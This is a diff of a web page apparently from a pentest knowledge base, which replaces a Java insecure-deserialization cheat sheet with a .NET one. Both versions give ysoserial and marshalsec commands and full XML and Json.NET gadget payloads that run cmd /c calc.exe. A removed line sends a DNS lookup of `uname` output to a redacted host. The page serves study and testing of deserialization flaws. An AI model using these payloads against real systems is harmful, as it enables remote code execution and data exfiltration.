@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Java insecure object deserialization attacks, everything you need to know">
+<meta name="description" content=".NET insecure deserialization attacks - everything you need to know">
 <meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Insecure Deserialization - Java" />
-<meta property="og:description" content="Java insecure object deserialization attacks, everything you need to know" />
+<meta name="color-scheme" content="light dark"><meta property="og:title" content=".NET Insecure Deserialization" />
+<meta property="og:description" content=".NET insecure deserialization attacks - everything you need to know" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/" /><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2023-03-23T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-03-27T03:49:08-04:00" />
-<title>Insecure Deserialization - Java | Gray Hat Freelancing</title>
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2023-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-03-27T00:00:00+00:00" />
+<title>.NET Insecure Deserialization | Gray Hat Freelancing</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
@@ -113,7 +113,7 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
   
 
   
-    <a href="/docs/insecure_deserialization/dotnet/" class="">.NET Insecure Deserialization</a>
+    <a href="/docs/insecure_deserialization/dotnet/" class="active">.NET Insecure Deserialization</a>
   
 
         </li>
@@ -165,7 +165,7 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
   
 
   
-    <a href="/docs/insecure_deserialization/java/" class="active">Insecure Deserialization - Java</a>
+    <a href="/docs/insecure_deserialization/java/" class="">Insecure Deserialization - Java</a>
   
 
         </li>
@@ -1180,7 +1180,7 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
     <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Insecure Deserialization - Java</strong>
+  <strong>.NET Insecure Deserialization</strong>
 
   <label for="toc-control">
     
@@ -1196,17 +1196,22 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#java-deserialization">Java Deserialization</a>
+    <li><a href="#net-serialization">.NET Serialization</a>
       <ul>
+        <li><a href="#summary">Summary</a></li>
         <li><a href="#detection">Detection</a></li>
-        <li><a href="#tools">Tools</a>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#formatters">Formatters</a>
           <ul>
-            <li><a href="#ysoserial">Ysoserial</a></li>
-            <li><a href="#burp-extensions-using-ysoserial">Burp extensions using ysoserial</a></li>
-            <li><a href="#alternative-tooling">Alternative Tooling</a></li>
+            <li><a href="#xmlserializer">XmlSerializer</a></li>
+            <li><a href="#datacontractserializer">DataContractSerializer</a></li>
+            <li><a href="#netdatacontractserializer">NetDataContractSerializer</a></li>
+            <li><a href="#losformatter">LosFormatter</a></li>
+            <li><a href="#jsonnet">JSON.NET</a></li>
+            <li><a href="#binaryformatter">BinaryFormatter</a></li>
           </ul>
         </li>
-        <li><a href="#gadgets">Gadgets</a></li>
+        <li><a href="#pop-gadgets">POP Gadgets</a></li>
         <li><a href="#references">References</a></li>
       </ul>
     </li>
@@ -1222,201 +1227,200 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
 
       
       
-  <article class="markdown"><h1 id="java-deserialization">
-  Java Deserialization
-  <a class="anchor" href="#java-deserialization">#</a>
+  <article class="markdown"><h1 id="net-serialization">
+  .NET Serialization
+  <a class="anchor" href="#net-serialization">#</a>
 </h1>
+<h2 id="summary">
+  Summary
+  <a class="anchor" href="#summary">#</a>
+</h2>
+<ul>
+<li><a href="#detection">Detection</a></li>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#formatters">Formatters</a>
+<ul>
+<li><a href="#xmlserializer">XmlSerializer</a></li>
+<li><a href="#datacontractserializer">DataContractSerializer</a></li>
+<li><a href="#netdatacontractserializer">NetDataContractSerializer</a></li>
+<li><a href="#losformatter">LosFormatter</a></li>
+<li><a href="#jsonnet">JSON.NET</a></li>
+<li><a href="#binaryformatter">BinaryFormatter</a></li>
+</ul>
+</li>
+<li><a href="#pop-gadgets">POP Gadgets</a></li>
+<li><a href="#references">References</a></li>
+</ul>
 <h2 id="detection">
   Detection
   <a class="anchor" href="#detection">#</a>
 </h2>
-<p><code>&quot;AC ED 00 05&quot;</code> in Hex
-<code>AC ED: __STREAM_MAGIC__.</code> Specifies that this is a serialization protocol.
-<code>00 05: __STREAM_VERSION__.</code> The serialization version.
-<code>&quot;rO0&quot;</code> in Base64
-<code>Content-type = &quot;application/x-java-serialized-object&quot;</code>
-<code>&quot;H4sIAAAAAAAAAJ&quot;</code> in gzip(base64)</p>
+<ul>
+<li><code>AAEAAD</code> (Hex) = .NET deserialization BinaryFormatter</li>
+<li><code>FF01</code> (Hex) / <code>/w</code> (Base64) = .NET ViewState</li>
+</ul>
+<p>Example: <code>AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=</code></p>
 <h2 id="tools">
   Tools
   <a class="anchor" href="#tools">#</a>
 </h2>
-<h3 id="ysoserial">
-  Ysoserial
-  <a class="anchor" href="#ysoserial">#</a>
-</h3>
-<p><a href="https://github.com/frohoff/ysoserial">frohoff/ysoserial</a> : A proof-of-concept tool for generating payloads that
-exploit unsafe Java object deserialization.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar ysoserial.jar CommonsCollections1 calc.exe &gt; commonpayload.bin
-</span></span><span style="display:flex;"><span>java -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.bin
-</span></span><span style="display:flex;"><span>java -jar ysoserial.jar Groovy1 <span style="color:#e6db74">&#39;ping 127.0.0.1&#39;</span> &gt; payload.bin
-</span></span><span style="display:flex;"><span>java -jar ysoserial.jar Jdk7u21 bash -c <span style="color:#e6db74">&#39;nslookup `uname`.[redacted]&#39;</span> | gzip | base64
-</span></span></code></pre></div><p>List of payloads included in ysoserial:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>	Payload             Authors                                Dependencies
-</span></span><span style="display:flex;"><span>	-------             -------                                ------------
-</span></span><span style="display:flex;"><span>	AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
-</span></span><span style="display:flex;"><span>	BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
-</span></span><span style="display:flex;"><span>	C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
-</span></span><span style="display:flex;"><span>	Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
-</span></span><span style="display:flex;"><span>	Clojure             @JackOfMostTrades                      clojure:1.8.0
-</span></span><span style="display:flex;"><span>	CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
-</span></span><span style="display:flex;"><span>	CommonsCollections1 @frohoff                               commons-collections:3.1
-</span></span><span style="display:flex;"><span>	CommonsCollections2 @frohoff                               commons-collections4:4.0
-</span></span><span style="display:flex;"><span>	CommonsCollections3 @frohoff                               commons-collections:3.1
-</span></span><span style="display:flex;"><span>	CommonsCollections4 @frohoff                               commons-collections4:4.0
-</span></span><span style="display:flex;"><span>	CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
-</span></span><span style="display:flex;"><span>	CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
-</span></span><span style="display:flex;"><span>	CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
-</span></span><span style="display:flex;"><span>	FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
-</span></span><span style="display:flex;"><span>	Groovy1             @frohoff                               groovy:2.3.9
-</span></span><span style="display:flex;"><span>	Hibernate1          @mbechler
-</span></span><span style="display:flex;"><span>	Hibernate2          @mbechler
-</span></span><span style="display:flex;"><span>	JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-</span></span><span style="display:flex;"><span>	JRMPClient          @mbechler
-</span></span><span style="display:flex;"><span>	JRMPListener        @mbechler
-</span></span><span style="display:flex;"><span>	JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-</span></span><span style="display:flex;"><span>	JavassistWeld1      @matthias_kaiser                      javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-</span></span><span style="display:flex;"><span>	Jdk7u21             @frohoff
-</span></span><span style="display:flex;"><span>	Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
-</span></span><span style="display:flex;"><span>	MozillaRhino1       @matthias_kaiser                       js:1.7R2
-</span></span><span style="display:flex;"><span>	MozillaRhino2       @_tint0                                js:1.7R2
-</span></span><span style="display:flex;"><span>	Myfaces1            @mbechler
-</span></span><span style="display:flex;"><span>	Myfaces2            @mbechler
-</span></span><span style="display:flex;"><span>	ROME                @mbechler                              rome:1.0
-</span></span><span style="display:flex;"><span>	Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
-</span></span><span style="display:flex;"><span>	Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
-</span></span><span style="display:flex;"><span>	URLDNS              @gebl
-</span></span><span style="display:flex;"><span>	Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
-</span></span><span style="display:flex;"><span>	Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
-</span></span></code></pre></div><h3 id="burp-extensions-using-ysoserial">
-  Burp extensions using ysoserial
-  <a class="anchor" href="#burp-extensions-using-ysoserial">#</a>
-</h3>
 <ul>
-<li>JavaSerialKiller</li>
-<li>Java Deserialization Scanner</li>
-<li>Burp-ysoserial</li>
-<li>SuperSerial</li>
-<li>SuperSerial-Active</li>
+<li><a href="https://github.com/pwntester/ysoserial.net">pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters</a></li>
 </ul>
-<h3 id="alternative-tooling">
-  Alternative Tooling
-  <a class="anchor" href="#alternative-tooling">#</a>
-</h3>
-<ul>
-<li>pwntester/JRE8u20_RCE_Gadget</li>
-<li>joaomatosf/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool</li>
-<li>pimps/ysoserial-modified</li>
-<li>NickstaDB/SerialBrute - Java serialization brute force attack tool</li>
-<li>NickstaDB/SerializationDumper - A tool to dump Java serialization streams in a more human readable form</li>
-<li>bishopfox/gadgetprobe</li>
-<li>mbechler/marshalsec - Turning your data into code execution</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ java -cp marshalsec.jar marshalsec.&lt;Marshaller&gt; <span style="color:#f92672">[</span>-a<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-v<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-t<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>&lt;gadget_type&gt; <span style="color:#f92672">[</span>&lt;arguments...&gt;<span style="color:#f92672">]]</span>
-</span></span><span style="display:flex;"><span>$ java -cp marshalsec.jar marshalsec.JsonIO Groovy <span style="color:#e6db74">&#34;cmd&#34;</span> <span style="color:#e6db74">&#34;/c&#34;</span> <span style="color:#e6db74">&#34;calc&#34;</span>
-</span></span><span style="display:flex;"><span>$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000<span style="color:#ae81ff">\#</span>exploit.JNDIExploit <span style="color:#ae81ff">1389</span>
-</span></span><span style="display:flex;"><span>		-a - generates/tests all payloads <span style="color:#66d9ef">for</span> that marshaller
-</span></span><span style="display:flex;"><span>		-t - runs in test mode, unmarshalling the generated payloads after generating them.
-</span></span><span style="display:flex;"><span>		-v - verbose mode, e.g. also shows the generated payload in test mode.
-</span></span><span style="display:flex;"><span> - gadget_type - Identifier of a specific gadget, <span style="color:#66d9ef">if</span> left out will display the available ones <span style="color:#66d9ef">for</span> that specific
-</span></span><span style="display:flex;"><span>marshaller.
-</span></span><span style="display:flex;"><span> - arguments - Gadget specific arguments
-</span></span></code></pre></div><p>Payload generators for the following marshallers are included:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">Marshaller</th>
-<th style="text-align:left">Gadget</th>
-<th style="text-align:left">Impact</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">BlazeDSAMF</td>
-<td style="text-align:left">(0</td>
-<td style="text-align:left">3</td>
-</tr>
-<tr>
-<td style="text-align:left">Hessian</td>
-<td style="text-align:left">Burlap</td>
-<td style="text-align:left">Various third party RCEs</td>
-</tr>
-<tr>
-<td style="text-align:left">Castor</td>
-<td style="text-align:left">dependency</td>
-<td style="text-align:left">library RCE</td>
-</tr>
-<tr>
-<td style="text-align:left">Jackson</td>
-<td style="text-align:left">possible</td>
-<td style="text-align:left">JDK only RCE, various third party RCEs</td>
-</tr>
-<tr>
-<td style="text-align:left">Java</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">yet another third party RCE</td>
-</tr>
-<tr>
-<td style="text-align:left">JsonIO</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">JDK only RCE</td>
-</tr>
-<tr>
-<td style="text-align:left">JYAML</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">JDK only RCE</td>
-</tr>
-<tr>
-<td style="text-align:left">Kryo</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">third party RCEs</td>
-</tr>
-<tr>
-<td style="text-align:left">KryoAltStrategy</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">JDK only RCE</td>
-</tr>
-<tr>
-<td style="text-align:left">Red5AMF(0</td>
-<td style="text-align:left">3)</td>
-<td style="text-align:left"></td>
-</tr>
-<tr>
-<td style="text-align:left">SnakeYAML</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">JDK only RCEs</td>
-</tr>
-<tr>
-<td style="text-align:left">XStream</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">JDK only RCEs</td>
-</tr>
-<tr>
-<td style="text-align:left">YAMLBeans</td>
-<td style="text-align:left"></td>
-<td style="text-align:left">third party RCE</td>
-</tr>
-</tbody>
-</table>
-<h2 id="gadgets">
-  Gadgets
-  <a class="anchor" href="#gadgets">#</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity <span style="color:#f92672">-f</span> Json.Net -s
+</span></span><span style="display:flex;"><span>$ ./ysoserial.exe -p DotNetNuke -m read_file <span style="color:#f92672">-f</span> win.ini
+</span></span><span style="display:flex;"><span>$ ./ysoserial.exe <span style="color:#f92672">-f</span> Json.Net -g ObjectDataProvider -o raw -c <span style="color:#e6db74">&#34;calc&#34;</span> -t
+</span></span><span style="display:flex;"><span>$ ./ysoserial.exe <span style="color:#f92672">-f</span> BinaryFormatter -g PSObject -o base64 -c <span style="color:#e6db74">&#34;calc&#34;</span> -t
+</span></span></code></pre></div><h2 id="formatters">
+  Formatters
+  <a class="anchor" href="#formatters">#</a>
 </h2>
-<p>Require: * java.io.Serializable</p>
+<p><img src="https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true" alt="NETNativeFormatters.png" /> <br>
+.NET Native Formatters from <a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15">pwntester/attacking-net-serialization</a></p>
+<h3 id="xmlserializer">
+  XmlSerializer
+  <a class="anchor" href="#xmlserializer">#</a>
+</h3>
+<ul>
+<li>In C# source code, look for <code>XmlSerializer(typeof(&lt;TYPE&gt;));</code>.</li>
+<li>The attacker must control the <strong>type</strong> of the XmlSerializer.</li>
+<li>Payload output: <strong>XML</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c &#34;calc.exe&#34;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;ExpandedWrapperOfXamlReaderObjectDataProvider</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;ExpandedElement/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;ProjectedProperty0&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;MethodName&gt;</span>Parse<span style="color:#f92672">&lt;/MethodName&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;MethodParameters&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;anyType</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;xsd:string&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">&lt;![CDATA[&lt;ResourceDictionary xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:d=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34; xmlns:b=&#34;clr-namespace:System;assembly=mscorlib&#34; xmlns:c=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&gt;&lt;ObjectDataProvider d:Key=&#34;&#34; ObjectType=&#34;{d:Type c:Process}&#34; MethodName=&#34;Start&#34;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc.exe&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/anyType&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/MethodParameters&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;ObjectInstance</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;XamlReader&#34;</span><span style="color:#f92672">&gt;&lt;/ObjectInstance&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/ProjectedProperty0&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/root&gt;</span>
+</span></span></code></pre></div><h3 id="datacontractserializer">
+  DataContractSerializer
+  <a class="anchor" href="#datacontractserializer">#</a>
+</h3>
+<blockquote>
+<p>The DataContractSerializer deserializes in a loosely coupled way. It never reads common language runtime (CLR) type and assembly names from the incoming data. The security model for the XmlSerializer is similar to that of the DataContractSerializer, and differs mostly in details. For example, the XmlIncludeAttribute attribute is used for type inclusion instead of the KnownTypeAttribute attribute.</p>
+</blockquote>
+<ul>
+<li>In C# source code, look for <code>DataContractSerializer(typeof(&lt;TYPE&gt;))</code>.</li>
+<li>Payload output: <strong>XML</strong></li>
+<li>Data <strong>Type</strong> must be user-controlled to be exploitable</li>
+</ul>
+<h3 id="netdatacontractserializer">
+  NetDataContractSerializer
+  <a class="anchor" href="#netdatacontractserializer">#</a>
+</h3>
+<blockquote>
+<p>It extends the <code>System.Runtime.Serialization.XmlObjectSerializer</code> class and is capable of serializing any type annotated with serializable attribute as <code>BinaryFormatter</code>.</p>
+</blockquote>
+<ul>
+<li>In C# source code, look for <code>NetDataContractSerializer().ReadObject()</code>.</li>
+<li>Payload output: <strong>XML</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>.\ysoserial.exe <span style="color:#f92672">-f</span> NetDataContractSerializer -g TypeConfuseDelegate -c <span style="color:#e6db74">&#34;calc.exe&#34;</span> -o base64 -t
+</span></span></code></pre></div><h3 id="losformatter">
+  LosFormatter
+  <a class="anchor" href="#losformatter">#</a>
+</h3>
+<ul>
+<li>Use <code>BinaryFormatter</code> internally.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>.\ysoserial.exe <span style="color:#f92672">-f</span> LosFormatter -g TypeConfuseDelegate -c <span style="color:#e6db74">&#34;calc.exe&#34;</span> -o base64 -t
+</span></span></code></pre></div><h3 id="jsonnet">
+  JSON.NET
+  <a class="anchor" href="#jsonnet">#</a>
+</h3>
+<ul>
+<li>In C# source code, look for <code>JsonConvert.DeserializeObject&lt;Expected&gt;(json, new JsonSerializerSettings</code>.</li>
+<li>Payload output: <strong>JSON</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>.\ysoserial.exe <span style="color:#f92672">-f</span> Json.Net -g ObjectDataProvider -o raw -c <span style="color:#e6db74">&#34;calc.exe&#34;</span> -t
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;$type&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#39;</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;MethodName&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;Start&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;MethodParameters&#39;</span><span style="color:#960050;background-color:#1e0010">:</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;$type&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;$values&#39;</span><span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#e6db74">&#39;/c calc.exe&#39;</span>]
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ObjectInstance&#39;</span><span style="color:#960050;background-color:#1e0010">:</span>{<span style="color:#e6db74">&#39;$type&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;</span>}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="binaryformatter">
+  BinaryFormatter
+  <a class="anchor" href="#binaryformatter">#</a>
+</h3>
+<blockquote>
+<p>The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they&rsquo;re processing to be trustworthy. BinaryFormatter is insecure and can’t be made secure.</p>
+</blockquote>
+<ul>
+<li>In C# source code, look for <code>System.Runtime.Serialization.Binary.BinaryFormatter</code>.</li>
+<li>Exploitation requires <code>[Serializable]</code> or <code>ISerializable</code> interface.</li>
+<li>Payload output: <strong>Binary</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>./ysoserial.exe <span style="color:#f92672">-f</span> BinaryFormatter -g PSObject -o base64 -c <span style="color:#e6db74">&#34;calc&#34;</span> -t
+</span></span></code></pre></div><h2 id="pop-gadgets">
+  POP Gadgets
+  <a class="anchor" href="#pop-gadgets">#</a>
+</h2>
+<p>These gadgets must have the following properties:</p>
+<ul>
+<li>Serializable</li>
+<li>Public/settable variables</li>
+<li>Magic &ldquo;functions&rdquo;: Get/Set, OnSerialisation, Constructors/Destructors</li>
+</ul>
+<p>You must carefully select your <strong>gadgets</strong> for a targeted <strong>formatter</strong>.</p>
+<p>List of popular gadgets used in common payloads.</p>
+<ul>
+<li><strong>ObjectDataProvider</strong> from <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll</code>
+<ul>
+<li>Use <code>MethodParameters</code> to set arbitrary parameters</li>
+<li>Use <code>MethodName</code> to call an arbitrary function</li>
+</ul>
+</li>
+<li><strong>ExpandedWrapper</strong>
+<ul>
+<li>Specify the <code>object types</code> of the objects that are encapsulated</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span>ExpandedWrapper&lt;Process, ObjectDataProvider&gt; myExpWrap = <span style="color:#66d9ef">new</span> ExpandedWrapper&lt;Process, ObjectDataProvider&gt;();
+</span></span></code></pre></div></li>
+<li><strong>System.Configuration.Install.AssemblyInstaller</strong>
+<ul>
+<li>Execute payload with Assembly.Load</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#75715e">// System.Configuration.Install.AssemblyInstaller</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> set_Path(<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">value</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">value</span> == <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.assembly = <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.assembly = Assembly.LoadFrom(<span style="color:#66d9ef">value</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+</ul>
 <h2 id="references">
   References
   <a class="anchor" href="#references">#</a>
 </h2>
 <ul>
-<li><a href="https://github.com/frohoff/ysoserial">Github - ysoserial</a></li>
